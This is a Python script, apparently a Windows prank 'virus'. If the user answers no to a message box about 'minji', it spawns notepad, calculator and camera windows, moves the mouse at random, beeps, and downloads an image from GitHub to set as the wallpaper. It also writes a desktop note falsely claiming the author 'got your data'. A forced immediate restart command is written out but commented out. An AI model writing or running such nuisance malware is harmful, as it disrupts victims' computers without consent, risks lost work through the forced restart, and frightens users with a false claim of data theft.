import os
import time
import pyautogui
import pynput
import ctypes
import random
import threading
import urllib.request
import winsound

userprofile = os.path.expanduser("~")
art = """                 :::!~!!!!!:. 
             .xUHWH!! !!?M88WHX:.
           .X*#M@$!!  !X!M$$$$$$WWx:.
          :!!!!!!?H! :!$!$$$$$$$$$$8X:
         !!~  ~:~!! :~!$!#$$$$$$$$$$8X:              WHY NOTT!!!!
        :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
        ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
          !:~~~ .:!M\"T#$$$$WX??#MRRMMM!       
          ~?WuxiW*`   `\"#$$$$8!!!!??!!!        
        :X- M$$$$       `\"T#$T~!8$WUXU~             
       :%`  ~#$$$m:        ~!~ ?$$$$$$/n             
     :!`.-   ~T$$$$8xx.  .xWW- ~\"\"##*\"     
   -~~:<` !    ~?T#$$@@W@*?$$      /`        
!!! .!~~ !!     .:XUW$W!~ `\"~:    :          
.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`     
!!`:X~ .: ?H.!u \"$$$B$$$!W:U!T$$M~     
 :X@!.-~   ?@WTWo("*$$$W$TH$! `       
X$?!-~    : ?$$$B$Wu("**$RM!            
~~ !     :   ~$$$$$B$$en:``         
Wx.~    :     ~\"##*$$$$M~           
"""

response = ctypes.windll.user32.MessageBoxW(0, "Hi, do you love minji or not?", "Virus", 1)

def sulking():
    from pynput.mouse import Button, Controller as M
    from pynput.keyboard import Key, Controller as K
    os.startfile("notepad.exe")
    time.sleep(.50)
    w = pyautogui.getWindowsWithTitle("Notepad")[0]
    w.activate()
    pyautogui.hotkey('win', 'up')
    M().position = (900,400)
    time.sleep(0.25)
    M().click(Button.left,1)
    time.sleep(0.25)
    K().type(art)
    
def tantrums():
    for i in range(3):
        os.system("start notepad.exe")
        os.system("start calc.exe")
        os.system("start microsoft.windows.camera:")
        
    for i in range(20):
        x = random.randint(0, pyautogui.size().width)
        y = random.randint(0, pyautogui.size().height)
        pyautogui.moveTo(x,y, duration = 0.2)
        time.sleep(0.30)

def last_message():
    ctypes.windll.user32.MessageBoxW(0, "Bye", "BYE BYE ( ﾟдﾟ)つ Bye", 0x40)

def shutdown():
    os.system("shutdown /r /t 0")

def change_wp():
    link = "https://github.com/rainbowmole/virus-something/main/minji.jpg"
    path = os.path.join(userprofile, "Pictures", "minji.jpg")
    
    urllib.request.urlretrieve(link, path)
    
    if os.path.exists(path):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    else:
        print("No wallpaper bro")

def message():
    desktop_path = os.path.join(userprofile, "Desktop")
    
    file_path = os.path.join(desktop_path, "OPEN!!.txt")
    
    msg = "I made your wallpaper into minji, maybe you will love her more in the future \n and I hope you do cause I got you data"
    
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(msg)
def mocking_sound():
    laugh_notes = [
        (1200, 150), (1300, 150), (1400, 150), (1500, 150),
        (1600, 150), (1700, 150), (1800, 150), (1900, 150)
    ]
    
    for freq, dur in laugh_notes:
        winsound.Beep(freq, dur)
        time.sleep(0.05)  # slight pause between notes

    winsound.Beep(1000, 200)
    time.sleep(0.1)
    winsound.Beep(1000, 200)
    time.sleep(0.1)
    winsound.Beep(1000, 200)
    time.sleep(0.1)
    winsound.Beep(1600, 400)
    
thread1 = threading.Thread(target=sulking)        
thread2 = threading.Thread(target=tantrums)
thread3 = threading.Thread(target=last_message)
thread4 = threading.Timer(1.5, shutdown)
thread5 = threading.Thread(target=change_wp)
thread6 = threading.Thread(target=message)
thread7 = threading.Thread(target=mocking_sound)
    
if response == 1:
    ctypes.windll.user32.MessageBoxW(0, "Di na virus", "Nice", 1)
else:
    thread7.start()
    thread1.start()
    thread2.start()
    
    thread1.join()
    thread2.join()
    
    thread5.start()
    thread6.start()
    
    #thread3.start()
    #thread4.start()
